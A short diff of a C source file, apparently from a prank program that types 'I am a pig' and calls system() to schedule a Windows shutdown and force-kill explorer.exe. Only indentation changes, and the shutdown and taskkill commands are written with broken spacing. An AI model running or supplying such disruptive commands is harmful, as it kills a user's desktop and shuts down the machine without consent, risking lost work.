@@ -3,7 +3,7 @@
           #include<stdlib.h>
           int main()
           {
-            char a[12],b[12]={"我是猪"};
+           char a[12],b[12]={"我是猪"};
             system("shut down-r-t 90");
             system("task kill/im explorer.exe/f");
             system("cls");
